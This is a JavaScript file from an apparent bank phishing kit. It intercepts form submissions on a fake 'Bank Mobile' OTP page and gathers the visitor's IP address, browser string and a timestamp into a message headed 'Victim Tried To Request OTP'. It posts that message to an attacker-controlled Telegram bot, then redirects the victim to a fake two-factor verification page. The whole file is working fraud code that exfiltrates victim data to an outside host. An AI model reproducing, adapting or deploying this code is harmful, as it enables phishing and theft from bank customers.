// your-script.js

// Function to load the config.json file
async function loadConfig() {
  try {
    const response = await fetch('config.json');
    
    // Check if the fetch was successful
    if (!response.ok) {
      throw new Error('Failed to load config.json');
    }

    const config = await response.json();
    console.log('Config loaded:', config); // Log the loaded config for debugging
    return config;
  } catch (error) {
    console.error('Error loading config:', error);
    return null; // Return null if there's an error fetching the config
  }
}

// Function to handle form submission
async function handleFormSubmit(event) {
  event.preventDefault();

  const form = event.target;
  const formData = new FormData(form);

  const send2FA = formData.get('send2FA') || 'Unknown'; // Get the OTP request info or default to 'Unknown'

  const ip = await getIPAddress(); // Get the user's IP address
  const browser = navigator.userAgent; // Get browser info
  const timestamp = new Date().toISOString().slice(0, 19).replace('T', ' '); // Get current timestamp

  const message = `Bank Mobile 🔐 Victim Tried To Request OTP\n` +
    `📍 IP: ${ip}\n` +
    `🖥 Browser: ${browser}\n` +
    `⏳ Time: ${timestamp}`;

  const config = await loadConfig(); // Load Telegram bot configuration

  if (!config) {
    console.error('Configuration not loaded.');
    return; // If config is null, stop the form submission
  }

  const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`; // Use bot token from config

  const data = {
    chat_id: config.telegramChatId, // Use chat ID from config
    text: message,
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    // Check if the message was successfully sent
    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    console.log('Message sent to Telegram successfully'); // Log success for debugging

    // Delay the redirect by 1 seconds (1000 milliseconds)
    setTimeout(() => {
      window.location.href = 'BMTX_TwoFactorAuthenticationVerify.html'; // Redirect after the delay
    }, 1000);

  } catch (error) {
    console.error('Error sending message:', error);
    // Delay the redirect even on error
    setTimeout(() => {
      window.location.href = 'BMTX_TwoFactorAuthenticationVerify.html'; // Redirect after the delay
    }, 1000);
  }
}

// Function to get the user's IP address
async function getIPAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP address:', error);
    return 'Unknown';
  }
}

// Wait for the DOM to be fully loaded before adding event listener
document.addEventListener('DOMContentLoaded', () => {
  const form = document.querySelector('form');
  if (form) {
    form.addEventListener('submit', handleFormSubmit);
  } else {
    console.error('Form not found');
  }
});
